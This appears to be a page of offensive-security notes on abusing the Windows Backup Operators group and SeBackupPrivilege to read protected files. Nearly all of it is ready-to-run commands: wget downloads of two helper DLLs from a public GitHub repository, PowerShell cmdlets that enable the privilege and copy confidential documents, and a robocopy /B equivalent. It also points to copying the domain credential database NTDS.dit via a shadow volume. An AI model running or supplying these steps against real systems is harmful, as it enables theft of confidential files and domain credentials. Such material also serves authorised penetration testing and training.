> Built-in group in windows
> Allows you to copy a file, and be able to read it
> !IMPORTANT: if copying `NTDS.dit`, make sure to create a shadow volume first, head to  `7. Lateral Movement/DCSync` for more detail

## SeBackupPrivilege

[Github page](https://github.com/giuliano108/SeBackupPrivilege)

This repo contains 2 `.dll` that you can use to enable and use the privilege of backup operators 

```sh
wget https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

View privilege

```powershell
whoami /priv
Get-SeBackupPrivilege
```

Enable `SeBackupPrivilege`

```powershell
Set-SeBackupPrivilege
```

Copy files

```powershell
Copy-FileSeBackupPrivilege 'C:\confidential\file.docx' .\file.docx
```

# Robocopy

> This is a built-in windows utility. Unlike copy, it can run with your `SeBackupPrivilege`, no need for external tool

```cmd
robocopy /B C:\Confidential .\Confidential file.docx
```